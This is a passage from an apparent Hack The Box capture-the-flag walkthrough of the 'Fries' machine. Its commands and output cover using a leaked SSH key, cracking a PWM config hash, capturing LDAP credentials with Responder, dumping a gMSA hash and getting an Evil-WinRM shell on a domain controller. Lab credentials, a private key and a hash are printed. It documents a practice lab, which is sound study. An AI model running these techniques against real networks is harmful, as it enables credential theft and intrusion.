BitVdk+9Ip0r+D8oCkGf7QFHgKn8fNyH0y02p6WhrI4Rhc32jgSUQV+wLUHmRL6KsRRHkH
C9vWgYNTHFJNfxojULYtrwuShBQYdfuT0bDB7nz1AAAFgC+08GUvtPBlAAAAB3NzaC1yc2
EAAAGBAIirFdYXaxJfn09GpLMqvt0VOxDl5QmSzNMt+xYCUMZDmcGkufqeb3sqgf97lP6n
+Eziy1fqUb4imi/SQ7uByykkdugiB898fp4glTNmEUpFQsw8l6xs2QigP6O4KIHc3huO9F
7e0cHt0DBm44SUBQyusgTuple8hcu1vAEOFXj/hLLWVJWs6KGKGSdi7o/AdA6W+HIcFTIO
QxCQNbsJMSAu3Y8AezAkZtKWcZGXJdhXlNkQvqikMo3WtyUJs51ABLGfIT4QVAek27715+
dxmbmMUQsM3FX5ZHCYp3RCMKMqIMP75hMJubFVosdQ9xK+7BrRdvpzZkdS+FqdUyrulXOo
PWDcMOuxt+cSlu0exhxCeQyhzld/F4NxdrQC4c8Y8Vdm/bVZz3e++Y8B0UMwYrVXZPvSKd
K/g/KApBn+0BR4Cp/Hzch9MtNqeloayOEYXN9o4ElEFfsC1B5kS+irEUR5Bwvb1oGDUxxS
TX8aI1C2La8LkoQUGHX7k9Gwwe589QAAAAMBAAEAAAGACUot1A1n9QoEa3BXGiml6yO6Dd
o+oRG2NAWcW2DhajSmoyvGC4PQ+puHVh0pocy7m0hQP6PZFhZGikkd2wVF0MBeh8VmaANj
nO6EjcealcSS94yH18vXTdeMs918/WTMwS1MrZUyR18Zp2ya+wRPuo62YZDyRCT3qELsal
rxeTXPKJPakIj+EBrxvkRiiGlxyhsXfLQteadQBjRzPokvqmsdGs8S0JEs3xQkWJvgUe4U
G1QgzZhJqmwFq3IXIDF9dr/7zSp+JsH2kP2UJwbj1K/IRrdI6Ey/yxFAz3ZXrcSoJ+ielx
sqSjQrPbldbCYsALpx1vf0lUxFg51GNkaa0m8PMcqzmV2gwGEoQLcOUQp4JPbzLNlaOKHx
5DawIZeFkcolLz15GC/FTDxiVv7FUBtwzG+JABTIAzIFHwL78UDixbQR3/inK034Ck1gl1
H7ZUeRRcN/fjcYgBMHMcgVDxrhnxvbvUXivlI/wxl9U9PlyRm4ItBXJfNb6xKyC+wZAAAA
wFtQbxFFJKg4lvH6SQ4/Si3hJkHOAeMHJKErGfa4EBP/FsaYC2jUGFixEEZxHRhDiidxYI
1fGC/DgbkvnTNIDICJc+qZFJfJ9oHzGgqg7sjjrJoU/2o9hw+nf1TdaZoDStGLZ0pOgqar
oCUNwitEIwWJZQtXeuIGWNdkAVQUXi23wSIEbcea0aQM0HfuKbnjKEvAu1v0myBAfuJ8n2
/f8XcOye2BAWMazrMkTF4JAkUO9LoyUf82qnDxGeIqOtCZZQAAAMEAwG2WMujGLuGFgVzb
utlV<SNIP>
-----END OPENSSH PRIVATE KEY-----

# cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCIqxXWF2sSX59PRqSzKr7dFTsQ5eUJkszTLfsWAlDGQ5nBpLn6nm97KoH/e5T+p/hM4stX6lG+Ipov0kO7gcspJHboIgfPfH6eIJUzZhFKRULMPJesbNkIoD+juCiB3N4bjvRe3tHB7dAwZuOElAUMrrIE7qZXvIXLtbwBDhV4/4Sy1lSVrOihihknYu6PwHQOlvhyHBUyDkMQkDW7CTEgLt2PAHswJGbSlnGRlyXYV5TZEL6opDKN1rclCbOdQASxnyE+EFQHpNu+9efncZm5jFELDNxV+WRwmKd0QjCjKiDD++YTCbmxVaLHUPcSvuwa0Xb6c2ZHUvhanVMq7pVzqD1g3DDrsbfnEpbtHsYcQnkMoc5XfxeDcXa0AuHPGPFXZv21Wc93vvmPAdFDMGK1V2T70inSv4PygKQZ/tAUeAqfx83IfTLTanpaGsjhGFzfaOBJRBX7AtQeZEvoqxFEeQcL29aBg1McUk1/GiNQti2vC5KEFBh1+5PRsMHufPU= root@web
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF/6QCKXFBRsJ7kDKTjtMOIrCKYQJ1MUKBf5qfFyyLb5 fries\administrator@DC01

─$ chmod 600 root_idrsa 
─$ ssh-keygen -l -f root_idrsa 
3072 SHA256:T5/vRllsBMCAfox5zcrFxXL+v8xPXsSqU/Usb/MhPog root@web (RSA)
```

Now use the key:

```bash
└─$ ssh -i root_idrsa -p 5000 root@localhost
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

root@web:~# cd /root
root@web:~# ls
scripts  snap  user.txt
root@web:~# cat user.txt
     HTB{REDACTED_FLAG}

root@web:~# cd scripts/
root@web:~/scripts# ls
clear-containers.sh  docker-compose.yml  pwm               start-web-svc.sh  web
clear-share.sh       gitea               restore-certs.sh  stop-web-svc.sh
```
# Lateral Movement 

We can find a `pwm` config:

```bash
root@web:~/scripts# cd pwm
root@web:~/scripts/pwm# ls
config  pwm-workpath
root@web:~/scripts/pwm# cat config
cat: config: Is a directory
root@web:~/scripts/pwm# cd config
root@web:~/scripts/pwm/config# ls
applicationPath.lock  backup  LocalDB  logs  PwmConfiguration.xml  temp
```

We have to access the `PWM` dashboard, first grab the cert, hash and key from config file:

```bash
root@web:~/scripts/pwm/config# cat PwmConfiguration.xml

 <properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>

<SNIP>
<setting key="ldap.serverCerts" modifyTime="2025-06-01T02:07:43Z" profile="default" syntax="X509CERT" syntaxVersion="0">
            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Certificates</label>
            <value>MIIGHzCCBQegAwIBAgITYQAAAAN8/vA0kyaMGAAAAAAAAzANBgkqhkiG9w0BAQsFADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRUwEwYKCZImiZPyLGQBGRYF
ZnJpZXMxFjAUBgNVBAMTDWZyaWVzLURDMDEtQ0EwHhcNMjUwNTE5MTQwODU2WhcNMjYwNTE5MTQwODU2WjAZMRcwFQYDVQQDEw5EQzAxLmZyaWVzLmh0YjCC
ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOFrlZ8gZ1W6nV9BF6FIJHPSjJ/yIyiudfpXtssyxb5ThMsjNpNOFNc3U4RAzo+7Z2Ae7sYJXusIsSEN
PxUocB4Sgd2ZDOYRvRq8qNJj8zDn1NwCJ0IGtYcTZzlG60bLfIPAg2qqrFV54+boEjx2X9ycupYcsf86FlQcjgxRnKxo4iS6H/Y4XZZRcas87hPuhcuuClzD
x0Gd/SOsfkaNufvvFZG710NzoUxEswnyV7RP9NLv8/ytxclyjSROW/WZRvivKqsu8BUUm01ZbNRHqTsM/HXlf1ZMPRJA40SsqK5ipF2G9aL74VRgX1JD0WOX
eTio2MxRYRbJLv+lBDSeagUCAwEAAaOCAzMwggMvMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAU
BggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDALBglg
hkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFKUYpctHX6QstNqH
45xGWYBTTE7uMB8GA1UdIwQYMBaAFC9C+rhPA+iG9d0/nz8cxpDIX1G6MIHGBgNVHR8Egb4wgbswgbiggbWggbKGga9sZGFwOi8vL0NOPWZyaWVzLURDMDEt
Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1mcmllcyxEQz1odGI/
Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYB
BQUHMAKGgZ1sZGFwOi8vL0NOPWZyaWVzLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
YXRpb24sREM9ZnJpZXMsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MDoGA1UdEQQzMDGgHwYJ
KwYBBAGCNxkBoBIEEDo3c4R+vaJDiexYPcBg0VeCDkRDMDEuZnJpZXMuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1TLTEtNS0yMS04
NTgzMzgzNDYtMzg2MTAzMDUxNi0zOTc1MjQwNDcyLTEwMDAwDQYJKoZIhvcNAQELBQADggEBAK+Fgaw6zsUoj1Xs6Go2yoQ+UzMe6orK60J+CgEsvynmokoz
0osjNfRSwg1aulKgDJjoOGRVeGjQok1GxkfqL4odnyKIpLBTlfIjDb6ACf+2yyFygQ9ooXXoeKYP7oSFK6WHb8I8oAEcErBxW5PfKBL4eJy+P8q2++pYGk+B
0f4gFYqtwa/7s7BJ6TqDnA5aOV99r8SWDQrnKB3CBUxSpEu4e/zwrtwKMmNDAlmOrDRmra97JEv4dHn6aXvNBOMFSfyQk/Rb9Bv3kB0N4PXZLp7afVr4AnYT
6Wz5tk0+sKvEA0qmo3wInHkm+9O63W4odTHc5lBhxSL+NgVSm+TY+yU=
</value>
        </setting>

<SNIP>

 <setting key="pwm.securityKey" modifyTime="2025-06-01T02:07:43Z" syntax="PASSWORD" syntaxVersion="0">
            <label>Settings ⇨ Security ⇨ Application Security ⇨ Security Key</label>
            <value>ENC-PW:7UUVOi0nYr3nlzC16WMbxnn7KGWhIBsc4x6b1Q3XdY2zEOWA9ZGAtIy5l5NrKZCGPo/CX9b5OG/SB7rC+hgAzogj3DlkbnkdDYaAGVJXgy+lec5LO1vQcjXzZNBeXA+suqONj+sujtwfdVUiblFG0pRCk3DKhp0GMEUefPrT3z7k2s+/zoN9Km3crFEWAuPHLeD6vmW2fgd2DCmdJZd/NSEhDJnkdOR3gEydzBGNUzwd7tf1Tfffn78wWSckoc9JBHPoWZBt6CjG/wlvGFWd9C0Y/Oyf5DCNB1jqf9H1esMsQkDVb5NOM7l7nLg0lVpfEiOQMLU2m6ugh1SaA3VuITTWNIVvD24b1zxhOokVNJQyE9s4KJJQZMiAlO355RHQIOqnuxxLd+zhl7wdnfIC5St+XjG0HWDmGa3dPYrZeDAwc5prebiZTxnyv3PHLrLEptp3E59SgsMrkA85gxh3PTN8UiqUZjk49LHcuZ7ZtoG6F+cXnV+saZ/uC618vG2gxr52jaBflknuVXYf5vbQeDc6GNnN2CuPFaRgrgk4Ov3wVrmqY8n5Zzp+rPu5ZxvAx9IHhEp1ZvFtnLOFqwmM/tbwGnTUOVCk0ySOYKJJV3t+sPM0kwjK0nU12TkswpIsGTOkPt0hyw5JKPOLTdIjs27dlceNSfKRQ6zN6Q2iQ+52VI6ky5dU8Q0iUuG6eUsANclgGIsym/mjLeQ9Xg3D13SgknnWelMCA2hNw/puoK/FnhdwqgkcxVenRU4SZLcajyv265jSvz5+AEXl8yjfPgp4MT7AEAqf7jSZA7A3PzTu0u1FwB4JRbhInJP1pXEmVzCLQ0l4OH1HLJW4BSOWi03wuaHNmns5eE0N8Z7xRBMnO6Pw/9kFe8clF8I/wfh/8l3Zyu7avO18/5NNnFYd7qLUOKjBD7w6hirXxH6efkT6wB4rHMgpeu3vTQ9vhvPIQiUFSlaDwYZ6D0Fe69fC2U46jW+e/oZc3Mtq4oTCcuHsW6BIVMjfb8+WNk3Ed9qjTAsrJFLo2BYJ5tBwavWsxTMuu8OpECgVu+NdbSvOcZ67J1rh2ZDn9ZDzEwPDe3sarTEEap3OvncX8sk9y0l9ltFjEdvM8mVp3EYP8p01ojDcj6m6uHIZVhgNXtOSSiR/O8z5d+8Dd+csZl3ueZjOPmqLfWjtgs3wsLtdpPgy6/LJl2NMgnhuj7H80Cd+flBbp90eZfweCTtRVvQzrYJERf3Uxp4C5ZxbINcqh0Ghu2OwgP3vcKcIrb27mRna/rdyrmJHGsHIuXX+f8c6afY3qMUHTO9pFesASqU2phUUdZm8NyKNrPlpf28fgyHKsj84pyimyxQ4EJ7oPlDHJAa9HRYOpYDr4E5GZ8Lru27XUKTXpeS8B2jrA1LjJSiyEdptkXrCd+VJpinC2W+9kv2UJSYIkGoBg2jKQ9kp2s4utfo=</value>
        </setting>
<SNIP>
```

Now decode them:

```bash
─$ base64 -d ldap.b64 > ldap.cert 
─$ base64 -d pwm_securityKey.b64 > pwm_securityKey 
```

And crack the hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/root]
└─$ john configpass.bcrypt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
     HTB{REDACTED_PASSWD}          (?)     
1g 0:00:00:01 DONE (2025-11-24 17:58) 0.8403g/s 18695p/s 18695c/s 18695C/s 131989..prakash
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

This is the dashboard password and we need it.
## PWM v2.0.8 Dashboard

Now locate `pwm` port:

```bash
root@web:~/scripts/pwm/config# ps aux | grep pwm
root        1507  3.6 23.2 3165624 679708 ?      Sl   00:21   1:23 java -server -Xmx1g -Xms1g -Xlog:gc:file=/config/logs/gc.log:time,uptime,level,tags:filecount=10,filesize=10M -jar /app/libs/pwm-onejar-2.0.8.jar -applicationPath /config
root        3649  0.0  0.0   6612  2560 pts/2    S+   00:59   0:00 grep --color=auto pwm

root@web:/etc/nginx/sites-available# cat default
server {
    listen 80;
    listen [::]:80;

    if ($host != fries.htb) {
        rewrite ^ http://fries.htb/;
    }

    server_name fries.htb;

        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;

        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:5000;
        }

}

server {
    listen 80;
    listen [::]:80;

    server_name db-mgmt05.fries.htb;

        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;

        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:5050;
        }

}

server {
    listen 80;
    listen [::]:80;

    server_name code.fries.htb;

        access_log /var/log/nginx/application.access.log;
        error_log /var/log/nginx/appliation.error.log;

        location / {
                include proxy_params;
                proxy_pass http://127.0.0.1:3000;
        }

}

server {
    listen 443 ssl;
    listen [::]:443 ssl;

    server_name pwm.fries.htb;

    ssl_certificate /etc/nginx/ssl/fullchain_pwm.pem;
    ssl_certificate_key /etc/nginx/ssl/privkey_pwm.pem;

    access_log /var/log/nginx/application.access.log;
    error_log /var/log/nginx/application.error.log;

    location / {
        proxy_ssl_verify off;
        include proxy_params;
        proxy_pass https://127.0.0.1:8443;
    }
}

root@web:/etc/nginx/sites-available# lsof -i :8443
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
docker-pr 1475 root    7u  IPv4  19102      0t0  TCP *:8443 (LISTEN)
docker-pr 1480 root    7u  IPv6  19103      0t0  TCP *:8443 (LISTEN)
```

PWM is configured to be accessed via `pwm.fries.htb` over **HTTPS (port 443)**. 
Specifically, Nginx is set up to forward requests from `https://pwm.fries.htb` to `https://127.0.0.1:8443`, where PWM is likely running.

We can forward the port `8443`:

```bash
meterpreter > portfwd add -l 5001 -p 8443 -r 192.168.100.2
[*] Forward TCP relay created: (local) :5001 -> (remote) 192.168.100.2:8443
```

Access it with the password on your browser:

![Pasted image 20251124191746.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251124191746.png)

Or we can simply access it also on the machine IP, add the subdomain to `/etc/hosts`:

```bash
10.10.11.96 dc01.fries.htb dc.fries.htb fries.htb code.fries.htb db-mgmt05.fries.htb pwm.fries.htb 
```

Then access the `HTTPS` URL:

![Pasted image 20251124202200.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251124202200.png)
## Responder

This version definitely had remote-resource loading behavior.

Any field that says **"URL"** or **"Image"** or **"Custom Resource"** in the Display/Theme settings can trigger a server-side request and we can capture the hashes with [Responder](../Starting%20Point/Tier%201/Responder.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fries/root]
└─$ sudo responder -I tun0 
```

Modify to trigger,add YOUR `LDAP` URL:

```rust
ldap://10.10.14.21:389
```

Check [Responder](../Starting%20Point/Tier%201/Responder.md):

```bash
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : HTB{REDACTED_PASSWD}
[*] Skipping previously captured cleartext password for CN=svc_infra,CN=Users,DC=fries,DC=htb
[*] Skipping previously captured cleartext password for CN=svc_infra,CN=Users,DC=fries,DC=htb
[*] Skipping previously captured cleartext password for CN=svc_infra,CN=Users,DC=fries,DC=htb
[*] Skipping previously captured cleartext password for CN=svc_infra,CN=Users,DC=fries,DC=htb
[+] Exiting...
```

We obtained the `svc_infra` account's password in clear-text, request a ticket for later:

```bash
└─$ impacket-getTGT fries.htb/'svc_infra':'HTB{REDACTED_PASSWD}' -dc-ip 10.10.11.96
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_infra.ccache
```
# Privilege Escalation Windows
## svc_infra to GMSA_CA_PROD$
### SMB

Check for shares on [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) with the found credentials:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ nxc smb fries.htb -u 'svc_infra' -p 'HTB{REDACTED_PASSWD}' --shares
SMB         10.10.11.96     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.96     445    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
SMB         10.10.11.96     445    DC01             [*] Enumerated shares
SMB         10.10.11.96     445    DC01             Share           Permissions     Remark
SMB         10.10.11.96     445    DC01             -----           -----------     ------
SMB         10.10.11.96     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.96     445    DC01             C$                              Default share
SMB         10.10.11.96     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.96     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.96     445    DC01             SYSVOL          READ            Logon server share 
```

Nothing really interesting here.
### Bloodhound

We have `svc_infra` account with his password `HTB{REDACTED_PASSWD}`, we can use [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md) to enumerate the domain:

```bash
nxc ldap dc.fries.htb -u 'svc_infra' -p 'HTB{REDACTED_PASSWD}' --bloodhound --collection All --dns-server 10.10.11.96
```

Or:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ bloodhound-python -u 'svc_infra' -p 'HTB{REDACTED_PASSWD}' -d fries.htb -ns 10.10.11.96 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fries.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 19 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: web
INFO: Querying computer: DC01.fries.htb
WARNING: Could not resolve: web: The resolution lifetime expired after 3.103 seconds: Server Do53:10.10.11.96@53 answered The DNS operation timed out.
INFO: Done in 00M 22S
INFO: Compressing output into 20251125104644_bloodhound.zip
```

Open your GUI:

![Pasted image 20251125105848.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251125105848.png)
![Pasted image 20251125110316.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251125110316.png)

We can `ReadGMSAPassword` for the `GMSA_CA_PROD$` account and he's member of `REMOTE MANAGEMENT USERS` so we can use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md).
### GMSA_CA_PROD$ hash to Evil-WinRM 

We can use `impacket` script `gMSADumper.py` to dump the hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ python gMSADumper.py -u svc_infra -p HTB{REDACTED_PASSWD} -d fries.htb
Users or groups who can read password for gMSA_CA_prod$:
 > svc_infra
gMSA_CA_prod$:::HTB{REDACTED_HASH}
gMSA_CA_prod$:aes256-cts-hmac-sha1-96:HTB{REDACTED_HASH}
gMSA_CA_prod$:aes128-cts-hmac-sha1-96:HTB{REDACTED_HASH}
```

Use it to request a ticket with `impacket-getTGT`:

```bash
─$ sudo timedatectl set-ntp off
─$ sudo rdate -n 10.10.11.96

─$ impacket-getTGT fries.htb/gMSA_CA_prod:HTB{REDACTED_HASH} -hashes :HTB{REDACTED_HASH} -dc-ip 10.10.11.96
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in gMSA_CA_prod.ccache

─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Fries/root/windows/gMSA_CA_prod.ccache 
─$ klist                                                                            
Ticket cache: FILE:/home/mdn0x/HTB/Machines/Fries/root/windows/gMSA_CA_prod.ccache
Default principal: gMSA_CA_prod@FRIES.HTB

Valid starting       Expires              Service principal
25/11/2025 18:20:18  26/11/2025 04:20:18  krbtgt/FRIES.HTB@FRIES.HTB
        renew until 26/11/2025 18:20:18
```

Now add REALM in `krb5` config and use it to access with [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ evil-winrm -i dc01.fries.htb -k gMSA_CA_prod.ccache -r FRIES.HTB 

Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\> cd Users
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/17/2025   9:26 PM                Administrator
d-----        5/21/2025   9:16 AM                b.briggs
d-----        5/21/2025   9:16 AM                b.horne
d-----        5/21/2025   9:16 AM                d.cooper
d-----        5/21/2025   9:14 AM                d.lynch
d-----        5/19/2025   8:44 AM                gMSA_CA_prod$
d-----        5/21/2025   9:16 AM                h.jennings
d-----        5/21/2025   9:16 AM                h.truman
d-----        5/21/2025   9:16 AM                j.hurley
d-----        5/21/2025   9:16 AM                l.johnson
d-----        5/21/2025   9:16 AM                l.palmer
d-r---        5/18/2025   5:19 AM                Public
d-----        5/21/2025   9:16 AM                s.johnson
d-----        5/21/2025   9:16 AM                w.earl

*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Downloads> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
FRIES\Domain Computers                      Group            S-1-5-21-858338346-3861030516-3975240472-515 Mandatory group, Enabled by default, Enabled group
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

#### Bloodhound / Rusthound

Try collect again for [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ bloodhound-python -u 'gMSA_CA_prod' --hashes ':HTB{REDACTED_HASH}' -d fries.htb -ns 10.10.11.96 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fries.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 19 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: web
INFO: Querying computer: DC01.fries.htb
WARNING: Could not resolve: web: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.11.96@53 answered The DNS operation timed out.
INFO: Done in 00M 18S
INFO: Compressing output into 20251125183242_bloodhound.zip
```

![Pasted image 20251125185734.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251125185734.png)

Using `rusthound-ce` collector:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Fries/root/windows]
└─$ ./rusthound-ce -d FRIES.HTB -u gMSA_CA_prod@fries.htb -k -z -f DC01.FRIES.HTB    
---------------------------------------------------
Initializing RustHound-CE
Powered by @g0h4n_0
---------------------------------------------------

[2025-11-26T16:34:39Z INFO  rusthound_ce] Verbosity level: Info
[2025-11-26T16:34:39Z INFO  rusthound_ce] Collection method: All
[2025-11-26T16:34:40Z INFO  rusthound_ce::ldap] Connected to FRIES.HTB Active Directory!
[2025-11-26T16:34:40Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-11-26T16:34:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-26T16:34:40Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=fries,DC=htb
[2025-11-26T16:34:40Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-26T16:34:41Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=fries,DC=htb
[2025-11-26T16:34:41Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-26T16:34:42Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=fries,DC=htb
[2025-11-26T16:34:42Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-26T16:34:42Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=fries,DC=htb
[2025-11-26T16:34:42Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-26T16:34:42Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=fries,DC=htb
[2025-11-26T16:34:42Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠂ Parsing LDAP objects: 42%                                                                          
rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2025-11-26T16:34:42Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 19 users parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 2 computers parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 75 containers parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-11-26T16:34:42Z INFO  rusthound_ce::json::maker::common] .//20251126163442_fries-htb_rusthound-ce.zip created!

